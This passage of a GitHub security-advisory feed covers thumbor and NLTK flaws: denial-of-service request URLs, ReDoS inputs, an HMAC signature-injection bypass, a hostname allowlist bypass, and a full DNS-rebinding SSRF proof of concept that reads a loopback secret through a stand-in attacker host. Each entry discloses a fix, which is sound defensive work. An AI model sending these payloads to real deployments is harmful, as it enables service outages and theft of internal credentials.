<h4 id="example-request-1-signed-url">Example request 1 (signed URL)</h4>
<p>The following request was used to reproduce the issue and causes severe resource exhaustion:</p>
<p><code>http://&lt;host&gt;:&lt;port&gt;/&lt;url-sign&gt;/100x100/filters:proportion(10000)/example.jpg</code></p>
<h4 id="example-request-2-unsafe">Example request 2 (/unsafe/)</h4>
<p>If <code>/unsafe/</code> is enabled:</p>
<p><code>http://&lt;host&gt;:&lt;port&gt;/unsafe/100x100/filters:proportion(10000)/example.jpg</code></p>
<h3 id="impact">Impact</h3>
<ul>
<li>Remote Denial of Service via CPU and/or memory exhaustion (and potentially process crash / OOM kill).</li>
<li>Exploitability depends on deployment:<ul>
<li>If <code>/unsafe/</code> is enabled: unauthenticated remote DoS.</li>
<li>If <code>/unsafe/</code> is disabled: the attacker needs a valid signed URL (i.e., the attacker can legitimately request signed URLs, or has access to signed URLs issued for other users/partners). If signed URLs are not exposed to untrusted parties, exploitability is reduced but the risk still applies to any party who can generate/use signed URLs.</li>
</ul>
</li>
</ul>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ul>
<li>Enforce a strict bound on the <code>proportion</code> parameter (e.g., <code>0.0 &lt; value &lt;= 1.0</code> as documented), or define a safe maximum based on intended semantics.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-phj3-59pf-cp83">https://github.com/thumbor/thumbor/security/advisories/GHSA-phj3-59pf-cp83</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/2c716119de986cfc68c7071af52a98187e006023">https://github.com/thumbor/thumbor/commit/2c716119de986cfc68c7071af52a98187e006023</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-phj3-59pf-cp83">https://github.com/advisories/GHSA-phj3-59pf-cp83</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phj3-59pf-cp83</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T19:00:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor has Regex Denial of Service (ReDoS) in `convolution` filter]]></title>
        <id>https://github.com/advisories/GHSA-5vjc-7cxw-4w6j</id>
        <link href="https://github.com/advisories/GHSA-5vjc-7cxw-4w6j"/>
        <updated>2026-07-31T18:58:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The regular expression used to parse the <code>convolution</code> filter exhibits exponential-time backtracking for certain inputs, enabling a Regular Expression Denial of Service (ReDoS).</p>
<h3 id="details">Details</h3>
<p>The RegExp for <code>convolution</code> is defined as <code>convolution\((?:\s*((?:[-]?[\d]+\.?[\d]*[;])*(?:[-]?[\d]+\.?[\d]*))\s*)(?:,\s*([\d]+)\s*)(?:,\s*([Tt]rue|[Ff]alse|1|0)\s*)?\)</code>. Within this expression a dangerous subpattern effectively behaves like <code>(\d+)*,\d+</code>.</p>
<h3 id="poc">PoC</h3>
<p>A filter string containing many repeated values will exhaust <code>re.match</code>:</p>
<ul>
<li><code>convolution(-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11)</code></li>
<li><a href="http://localhost:8888/unsafe/0x0/smart/filters:convolution(-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11)/x.png">http://localhost:8888/unsafe/0x0/smart/filters:convolution(-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11)/x.png</a></li>
</ul>
<p>The evaluation occurs on <a href="https://github.com/thumbor/thumbor/blob/master/thumbor/filters/__init__.py#L189">https://github.com/thumbor/thumbor/blob/master/thumbor/filters/__init__.py#L189</a>.</p>
<h3 id="impact">Impact</h3>
<p>A specially crafted URL will lead to denial of service, as new images won't be processed until <code>re.match</code> returns.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-5vjc-7cxw-4w6j">https://github.com/thumbor/thumbor/security/advisories/GHSA-5vjc-7cxw-4w6j</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/3f38fe1610d20168e91f76d432212de30727eb2e">https://github.com/thumbor/thumbor/commit/3f38fe1610d20168e91f76d432212de30727eb2e</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5vjc-7cxw-4w6j">https://github.com/advisories/GHSA-5vjc-7cxw-4w6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vjc-7cxw-4w6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T18:58:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor convolution filter allows divide-by-zero in C extension leading to remote DoS]]></title>
        <id>https://github.com/advisories/GHSA-cqjp-jf4r-h5q9</id>
        <link href="https://github.com/advisories/GHSA-cqjp-jf4r-h5q9"/>
        <updated>2026-07-31T18:54:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Thumbor's <code>filters:convolution(&lt;matrix&gt;, &lt;columns&gt;, &lt;should_normalize&gt;)</code> filter passes the user-controlled <code>&lt;columns&gt;</code> value to a C extension (<code>thumbor/ext/filters/_convolution.c</code>) where it is used as a divisor (for <code>%</code> and <code>/</code>) without validating <code>columns &gt; 0</code>. When <code>columns=0</code>, the C code triggers undefined behavior; on x86_64 this reliably results in a fatal divide-by-zero trap (SIGFPE) and crashes the Thumbor process (confirmed on Linux x86_64 and macOS Intel x86_64), causing a remote denial of service.</p>
<h3 id="details">Details</h3>
<h4 id="root-cause">Root cause</h4>
<p>The Python filter accepts <code>columns=0</code>, and the native C extension uses <code>columns_count</code> as a divisor without validating it.</p>
<ol>
<li>Python filter entry point allows <code>columns=0</code> (<code>thumbor/filters/convolution.py</code>):</li>
</ol>
<pre><code class="language-python">@filter_method(
    r"(?:[-]?[\d]+\.?[\d]*[;])*(?:[-]?[\d]+\.?[\d]*)",
    BaseFilter.PositiveNumber,  # accepts 0
    BaseFilter.Boolean,
)
async def convolution(self, matrix, columns, should_normalize=True):
    ...
    imgdata = _convolution.apply(..., matrix, columns, should_normalize)
</code></pre>
<p><code>BaseFilter.PositiveNumber</code> matches <code>"0"</code> (<code>thumbor/filters/__init__.py</code>):</p>
<pre><code class="language-python">class BaseFilter:
    PositiveNumber = {"regex": r"[\d]+", "parse": int}  # matches "0"
    PositiveNonZeroNumber = {"regex": r"[\d]*[1-9][\d]*", "parse": int}
</code></pre>
<ol start="2">
<li>C extension divides/modulos by <code>columns_count</code> without a zero check (<code>thumbor/ext/filters/_convolution.c</code>):</li>
</ol>
<pre><code class="language-c">kernel_size = PyTuple_Size(kernel_tuple);
if ((kernel_size % columns_count != 0) ||
    (kernel_size % 2 == 0) ||
    ((kernel_size / columns_count) % 2) == 0) {
    // TODO: error, not a valid kernel
    return NULL;
}
</code></pre>
<h3 id="poc">PoC</h3>
<h4 id="test-environment">Test environment</h4>
<ul>
<li>Linux x86_64</li>
</ul>
<h4 id="preconditions">Preconditions</h4>
<ul>
<li>The <code>convolution</code> filter is enabled (it is enabled by default via <code>BUILTIN_FILTERS</code>).</li>
<li>Either:<ul>
<li><code>/unsafe/</code> URLs are allowed (<code>ALLOW_UNSAFE_URL=True</code>), OR</li>
<li><code>/unsafe/</code> is disabled, and the attacker has a valid signed URL (i.e., the attacker is an authorized user/partner, or can obtain signed URLs from a trusted signing service).</li>
</ul>
</li>
</ul>
<h4 id="example-request-signed-url">Example request (signed URL)</h4>
<p><code>http://&lt;host&gt;:&lt;port&gt;/&lt;url-sign&gt;/400x400/filters:convolution(1;2;1;2;4;2;1;2;1,0,true)/example.jpg</code></p>
<h4 id="example-request-unsafe">Example request (/unsafe/)</h4>
<p><code>http://&lt;host&gt;:&lt;port&gt;/unsafe/400x400/filters:convolution(1;2;1;2;4;2;1;2;1,0,true)/example.jpg</code></p>
<h3 id="impact">Impact</h3>
<ul>
<li>Remote Denial of Service via process crash (SIGFPE) on x86_64 (confirmed on Linux x86_64 and macOS Intel x86_64).</li>
<li>Exploitability depends on deployment:<ul>
<li>If <code>/unsafe/</code> is enabled: unauthenticated remote DoS.</li>
<li>If <code>/unsafe/</code> is disabled: the attacker needs a valid signed URL.(i.e., the attacker is an authorized user/partner, or can obtain signed URLs from a trusted signing service)</li>
</ul>
</li>
</ul>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ul>
<li>In the C extension (<code>thumbor/ext/filters/_convolution.c</code>):<ul>
<li>Reject <code>columns_count &lt;= 0</code> before any <code>%</code> or <code>/</code>.</li>
</ul>
</li>
<li>In the Python filter (<code>thumbor/filters/convolution.py</code>):<ul>
<li>Require <code>columns</code> to be non-zero (e.g., use <code>BaseFilter.PositiveNonZeroNumber</code>).</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-cqjp-jf4r-h5q9">https://github.com/thumbor/thumbor/security/advisories/GHSA-cqjp-jf4r-h5q9</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/447e192e3fb92e64c12e5354a56a4a7133f69d73">https://github.com/thumbor/thumbor/commit/447e192e3fb92e64c12e5354a56a4a7133f69d73</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cqjp-jf4r-h5q9">https://github.com/advisories/GHSA-cqjp-jf4r-h5q9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqjp-jf4r-h5q9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T18:54:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor has HMAC validation bypass via multiple .replace() calls when removing URL signature]]></title>
        <id>https://github.com/advisories/GHSA-mw3h-qjxj-6xg9</id>
        <link href="https://github.com/advisories/GHSA-mw3h-qjxj-6xg9"/>
        <updated>2026-07-31T18:51:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="hmac-validation-bypass-via-multiple-replace-calls-when-removing-url-signature">HMAC validation bypass via multiple <code>.replace()</code> calls when removing URL signature</h1>
<h2 id="summary">Summary</h2>
<p>Thumbor’s HMAC validation can be bypassed due to the use of Python’s <code>.replace()</code> when removing the signature from the URL before validation. Since <code>.replace()</code> removes <strong>all occurrences</strong> of the substring, an attacker can insert the same signature multiple times in the URL and manipulate the final URL used for validation.</p>
<p>This allows crafting URLs where the validated string differs from the actual requested resource, enabling loading images from unintended domains or paths.</p>
<h2 id="details">Details</h2>
<p>Thumbor signs URLs using <strong>HMAC-SHA1</strong> to prevent abuse such as loading arbitrary external images or invoking filters without authorization.</p>
<p>During request validation, Thumbor removes the signature from the request URL before recalculating the HMAC. The relevant code:</p>
<pre><code class="language-python">url_signature = self.context.request.hash
if url_signature:
    signer = self.context.modules.url_signer(
        self.context.server.security_key
    )

    try:
        quoted_hash = quote(self.context.request.hash)
    except KeyError:
        self._error(400, f"Invalid hash: {self.context.request.hash}")
        return

    url_to_validate = url.replace(
        f"/{self.context.request.hash}/", ""
    ).replace(f"/{quoted_hash}/", "")

    valid = signer.validate(
        unquote(url_signature).encode(), url_to_validate
    )
</code></pre>
<p>The issue is that <code>.replace()</code> removes <strong>every occurrence</strong> of the substring in the URL, not just the first one.</p>
<p>Because the signature itself appears in the URL, an attacker can <strong>inject additional copies of the signature</strong> elsewhere in the path. When Thumbor performs <code>.replace()</code>, these extra occurrences are also removed, resulting in a different <code>url_to_validate</code> than the original request.</p>
<h2 id="example">Example</h2>
<p>Valid request:</p>
<pre><code>/ddoyYVYUbDf6Po_dzOrBhCDrXLc=/300x200/s3.glbimg.com/v1/.../image.jpg
</code></pre>
<p>By injecting the same hash inside the URL:</p>
<pre><code>/ddoyYVYUbDf6Po_dzOrBhCDrXLc=/300x200/s3.glbimg.co/ddoyYVYUbDf6Po_dzOrBhCDrXLc=/m/v1/.../image.jpg
</code></pre>
<p>After <code>.replace()</code> removes all occurrences of the hash, the URL used for validation differs from the effective request path. This allows manipulation of the upstream host or path.</p>
<p>Further manipulation is possible due to the <strong>second <code>.replace()</code> for the URL-encoded hash (<code>%3D</code>)</strong>, enabling more precise path manipulation.</p>
<p>Example:</p>
<pre><code>/ddoyYVYUbDf6Po_dzOrBhCDrXLc=/300x200/s3.glbimg.com/ddoyYVYUbDf6Po/ddoyYVYUbDf6Po_dzOrBhCDrXLc%3D/ddoyYVYUbDf6Po/v1/...
</code></pre>
<h2 id="impact">Impact</h2>
<p>This behavior may allow attackers to:</p>
<ul>
<li>Bypass HMAC URL validation</li>
<li>Load images from arbitrary domains</li>
<li>Abuse Thumbor deployments as an open proxy / image fetcher</li>
<li>Circumvent domain restrictions intended by the signed URL mechanism</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p>Use of <code>.replace()</code> without limiting the number of replacements when removing the signature from the URL.</p>
<p>Since the signature is part of the request path, using a global replacement allows attackers to place additional occurrences of the same substring to influence the validated string.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Remove only the first occurrence of the signature or explicitly parse the URL components instead of performing global string replacement.</p>
<p>Example:</p>
<pre><code class="language-python">url.replace(f"/{self.context.request.hash}/", "", 1)
</code></pre>
<p>Alternatively, reconstruct the unsigned URL deterministically from the parsed request components.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-mw3h-qjxj-6xg9">https://github.com/thumbor/thumbor/security/advisories/GHSA-mw3h-qjxj-6xg9</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/e3ae3e2500537b4d735df4144129a649374bb70b">https://github.com/thumbor/thumbor/commit/e3ae3e2500537b4d735df4144129a649374bb70b</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-mw3h-qjxj-6xg9">https://github.com/advisories/GHSA-mw3h-qjxj-6xg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mw3h-qjxj-6xg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T18:51:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thumbor] Thumbor treats ALLOWED_SOURCES string patterns as unescaped regex, allowing hostname bypass via wildcard dot]]></title>
        <id>https://github.com/advisories/GHSA-6x26-6r6f-m537</id>
        <link href="https://github.com/advisories/GHSA-6x26-6r6f-m537"/>
        <updated>2026-07-31T18:36:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>ALLOWED_SOURCES</code> configuration is meant to restrict which hosts Thumbor's HTTP loader may fetch images from. Plain-string entries in that list (the overwhelming majority of real-world and documented configurations) are passed directly to <code>re.match()</code> without escaping. Because <code>.</code> is a regex wildcard, every dot in a domain name becomes a bypass vector: <code>s.glbimg.com</code> silently matches <code>sXglbimgYcom</code>, <code>sAglbimg.com</code>, and any other hostname that differs only at a dot position. This undermines the primary SSRF defence that <code>ALLOWED_SOURCES</code> is intended to provide.</p>
<h2 id="affected-component">Affected component</h2>
<p><code>thumbor/loaders/http_loader.py</code> — <code>validate()</code></p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code class="language-python">import re
from thumbor.config import Config
from thumbor.context import Context
from thumbor.loaders import http_loader as loader

config = Config()
config.ALLOWED_SOURCES = ["s.glbimg.com"]   # typical user config
ctx = Context(None, config, None)

# These should be blocked — both return True due to the unescaped dot
print(loader.validate(ctx, "http://sXglbimgYcom/secret.jpg"))  # True ← bypass
print(loader.validate(ctx, "http://sAglbimg.com/secret.jpg"))  # True ← bypass

# Legitimate origin — correctly allowed
print(loader.validate(ctx, "http://s.glbimg.com/logo.jpg"))    # True ← correct
</code></pre>
<h2 id="root-cause">Root cause</h2>
<p><code>thumbor/loaders/http_loader.py</code> (before fix):</p>
<pre><code class="language-python">for pattern in context.config.ALLOWED_SOURCES:
    if isinstance(pattern, Pattern):
        match = url
    else:
        pattern = f"^{pattern}$"   # &lt;-- dots not escaped, act as regex wildcard
        match = res.hostname

    if re.match(pattern, match):
        return True
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can influence the image source URL passed to Thumbor can fetch images from arbitrary hosts, bypassing the <code>ALLOWED_SOURCES</code> allowlist.</p>
<p><strong>Preconditions:</strong></p>
<ul>
<li><code>ALLOWED_SOURCES</code> contains at least one plain-string entry (the common case; all official documentation examples use plain strings).</li>
<li>The attacker can supply or influence the image URL — true whenever  <code>ALLOW_UNSAFE_URL = True</code> (the default), or when the application forwards user input to a signed URL endpoint.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Apply <code>re.escape()</code> to plain-string patterns before compiling them, so every
character is matched literally:</p>
<pre><code class="language-python">else:
    pattern = f"^{re.escape(pattern)}$"   # dots and other metacharacters are now literal
    match = res.hostname
</code></pre>
<p>This is a one-call addition with no breaking change for correctly written configurations. Users who need real regular-expression behaviour should supply a compiled pattern (<code>re.compile(r"s\.glbimg\.com")</code>), which is already handled by the existing <code>isinstance(pattern, Pattern)</code> branch and is unaffected by this change.</p>
<p>The <code>ALLOWED_SOURCES</code> docstring in <code>config.py</code> was also updated to document the two-mode behaviour explicitly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-6x26-6r6f-m537">https://github.com/thumbor/thumbor/security/advisories/GHSA-6x26-6r6f-m537</a></li>
<li><a href="https://github.com/thumbor/thumbor/commit/68876715350c6c8f49c324e5515e64908830aed7">https://github.com/thumbor/thumbor/commit/68876715350c6c8f49c324e5515e64908830aed7</a></li>
<li><a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0">https://github.com/thumbor/thumbor/releases/tag/7.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6x26-6r6f-m537">https://github.com/advisories/GHSA-6x26-6r6f-m537</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6x26-6r6f-m537</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T18:36:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): DNS-rebinding SSRF filter bypass in nltk.pathsec.urlopen (nltk.download / nltk.data.load) defeats ENFORCE mode]]></title>
        <id>https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</id>
        <link href="https://github.com/advisories/GHSA-qvv7-cg9c-w4x3"/>
        <updated>2026-07-31T16:51:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.pathsec</code> provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict <code>ENFORCE</code> mode for security-sensitive environments. The filter is bypassable by DNS rebinding: <code>validate_network_url()</code> resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under <code>nltk.pathsec.ENFORCE = True</code>.</p>
<h3 id="details">Details</h3>
<p><code>urlopen()</code> validates, then hands the raw hostname to <code>urllib</code>, which performs a second name resolution deep in the connection layer (<code>http.client.HTTPConnection.connect</code> → <code>socket.create_connection</code> → <code>socket.getaddrinfo</code>). The validation-side and connection-side resolutions are fully independent code paths with independent caches:</p>
<ol>
<li><code>validate_network_url()</code> calls <code>_resolve_hostname(parsed.hostname)</code> and checks each returned IP against loopback/link-local/multicast/private, blocking under <code>ENFORCE</code>. (Resolution #1.)</li>
<li><code>urlopen()</code> then calls <code>build_opener(...).open(url)</code> with the original URL (raw hostname), so <code>urllib</code> resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)</li>
</ol>
<p><code>_resolve_hostname</code> is decorated with <code>lru_cache</code> and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's <code>getaddrinfo</code> does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import socket
import threading
import warnings
from collections import defaultdict
from http.server import BaseHTTPRequestHandler, HTTPServer

warnings.filterwarnings("ignore")

import nltk
import nltk.pathsec as ps

ps.ENFORCE = True  # the documented strict SSRF sandbox

ATTACKER_HOST = "rebind.attacker.test"   # attacker-controlled authoritative DNS
PUBLIC_IP = "93.184.216.34"              # public address served for the validation lookup
SECRET = b"TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS"


# --- A loopback-only "internal service" (stands in for 169.254.169.254 / admin UI) ---
class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(SECRET)))
        self.end_headers()
        self.wfile.write(SECRET)

    def log_message(self, *a):
        pass


def start_internal_server():
    srv = HTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv.server_address[1]  # ephemeral port


# --- Model the TTL-0 rebinding record at the resolver layer ---
_real_getaddrinfo = socket.getaddrinfo
_lookups = defaultdict(int)


def _rebinding_getaddrinfo(host, port, *args, **kwargs):
    if host == ATTACKER_HOST:
        n = _lookups[host]
        _lookups[host] += 1
        ip = PUBLIC_IP if n == 0 else "127.0.0.1"   # 1st=public (validate), then loopback (connect)
        p = port if isinstance(port, int) else 0
        kind = "VALIDATION -&gt; public" if n == 0 else "CONNECT    -&gt; loopback"
        print(f"    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})")
        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, p))]
    return _real_getaddrinfo(host, port, *args, **kwargs)


def fetch(url):
    with ps.urlopen(url, timeout=5) as r:
        return r.read()


def main():
    print("=" * 62)
    print(f" NLTK pathsec DNS-rebinding SSRF bypass PoC")
    print(f" nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}")
    print("=" * 62)

    port = start_internal_server()
    print(f"[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\n")

    socket.getaddrinfo = _rebinding_getaddrinfo
    ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process
    try:
        # ---- Control: a DIRECT loopback URL must be blocked by the filter ----
        print("[1] CONTROL: direct loopback URL (filter must block this)")
        direct = f"http://127.0.0.1:{port}/"
        try:
            fetch(direct)
            print(f"    [?] unexpected: {direct} was NOT blocked\n")
            control_ok = False
        except PermissionError as e:
            print(f"    [OK] blocked -&gt; PermissionError: {e}\n")
            control_ok = True

        # ---- Attack: rebinding hostname bypasses the same filter ----
        print("[2] ATTACK: rebinding hostname (public at validate, loopback at connect)")
        evil = f"http://{ATTACKER_HOST}:{port}/"
        print(f"    fetching {evil}")
        try:
            body = fetch(evil)
            leaked = SECRET in body
            print(f"    body returned to caller: {body!r}")
            if leaked:
                print("\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen")
                print(f"         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1")
                print(f"         non-blind SSRF despite ENFORCE = {ps.ENFORCE}")
                verdict = "VULNERABLE"
            else:
                print("\n  [?] fetch succeeded but secret marker not present")
                verdict = "INCONCLUSIVE"
        except PermissionError as e:
            # Patched build: validate against the connect-time IP (or pin/resolve-once).
            print(f"\n  [SAFE] blocked -&gt; PermissionError: {e}")
            verdict = "NOT VULNERABLE"
    finally:
        socket.getaddrinfo = _real_getaddrinfo

    print("\n" + "=" * 62)
    print(f" Control (direct loopback blocked): {control_ok}")
    print(f" Result: {verdict}   (ENFORCE = {ps.ENFORCE})")
    print("=" * 62)


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Full-response (non-blind) SSRF.</strong> Because the fetched body is returned to the caller (e.g. <code>nltk.data.load</code> with <code>format="raw"</code>), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise.</li>
<li><strong>Bypass of an explicit security control.</strong> It defeats the <code>nltk.pathsec</code> SSRF filter, including the <code>ENFORCE</code> mode that NLTK's documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the <code>lru_cache</code> annotation claiming to mitigate rebinding makes the false assurance worse.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3">https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3</a></li>
<li><a href="https://github.com/advisories/GHSA-qvv7-cg9c-w4x3">https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T16:51:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex]]></title>
        <id>https://github.com/advisories/GHSA-fg7f-2386-8897</id>
        <link href="https://github.com/advisories/GHSA-fg7f-2386-8897"/>
        <updated>2026-07-31T16:51:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>ReviewsCorpusReader</code> extracts feature annotations of the form <em>label</em> followed by a bracketed signed digit (e.g. a label then <code>[+2]</code>) from each review line, using the module-level <code>FEATURES</code> regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal <code>[</code>. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs <code>reviews()</code>, <code>features()</code>, and <code>sents()</code>. </p>
<h3 id="details">Details</h3>
<p>The label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal <code>[</code>. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the <em>n</em> starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. <code>re.findall</code> repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.</p>
<h3 id="poc">PoC</h3>
<pre><code>import multiprocessing as mp
import re
import time

# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---
FEATURES_VULN = re.compile(r"((?:(?:\w+\s)+)?\w+)\[((?:\+|\-)\d)\]")

# --- Bounded variant from the fix (PR #3583): cap the per-label word run.
#     A generous bound (real feature labels are short noun phrases) makes the
#     run linear while never affecting legitimate corpora. ---
WORD_BOUND = 50
FEATURES_FIXED = re.compile(
    r"((?:(?:\w+\s){0,%d})?\w+)\[((?:\+|\-)\d)\]" % WORD_BOUND
)

TIMEOUT = 20.0  # seconds, per measurement
SIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line


def _bad_line(n_words):
    """A long line of plain words with NO trailing bracketed annotation."""
    return ("word " * n_words).rstrip()


def _worker(pattern_str, line, q):
    pat = re.compile(pattern_str)
    t0 = time.perf_counter()
    pat.findall(line)
    q.put(time.perf_counter() - t0)


def timed_findall(pattern, line, timeout=TIMEOUT):
    """Run pattern.findall(line) in a killable process; return seconds or None (timeout)."""
    q = mp.Queue()
    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else None


def bench(label, pattern):
    print(f"\n[{label}]  pattern: {pattern.pattern}")
    print(f"  {'words':&gt;7} {'~bytes':&gt;8}   {'time':&gt;12}   {'x prev':&gt;7}")
    prev = None
    for n in SIZES:
        line = _bad_line(n)
        t = timed_findall(pattern, line)
        if t is None:
            print(f"  {n:&gt;7} {len(line):&gt;8}   {'&gt;%.0fs TIMEOUT' % TIMEOUT:&gt;12}   {'--':&gt;7}")
            prev = None
        else:
            ratio = f"{t/prev:.1f}x" if prev else "--"
            print(f"  {n:&gt;7} {len(line):&gt;8}   {t*1000:&gt;9.1f} ms   {ratio:&gt;7}")
            prev = t


def parity_check():
    """The bound must NOT change extraction on a realistic annotated line."""
    real = (
        "the picture quality[+2] and battery life[+1] are great but "
        "the lens cap[-1] feels cheap and the menu system[-2] is slow"
    )
    a = FEATURES_VULN.findall(real)
    b = FEATURES_FIXED.findall(real)
    print("\n[parity] realistic annotated line — extraction must be identical")
    print(f"  vulnerable regex -&gt; {a}")
    print(f"  bounded   regex  -&gt; {b}")
